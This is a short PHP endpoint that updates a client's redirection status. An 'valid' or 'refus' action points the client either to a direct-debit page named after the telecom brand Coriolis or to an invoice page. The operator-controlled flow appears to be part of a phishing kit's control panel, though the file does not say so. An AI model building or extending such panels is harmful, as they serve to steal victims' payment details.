<?php
header('Content-Type: application/json');
require_once __DIR__ . '/storage.php';

$data = json_decode(file_get_contents('php://input'), true);

if (!$data || empty($data['clientId']) || empty($data['action'])) {
    echo json_encode(['success' => false, 'error' => 'Paramètres manquants']);
    exit;
}

$redirections = getRedirections();

foreach ($redirections as &$r) {
    if ($r['clientId'] === $data['clientId']) {
        if ($data['action'] === 'valid') {
            $r['status'] = 'redirige';
            $r['destinationUrl'] = '/coriolis-prelevement.html';
        } elseif ($data['action'] === 'refus') {
            $r['status'] = 'refuse';
            $r['destinationUrl'] = '/facture.html';
        }
        break;
    }
}

if (saveRedirections($redirections)) {
    echo json_encode(['success' => true]);
} else {
    echo json_encode(['success' => false, 'error' => 'Erreur sauvegarde']);
}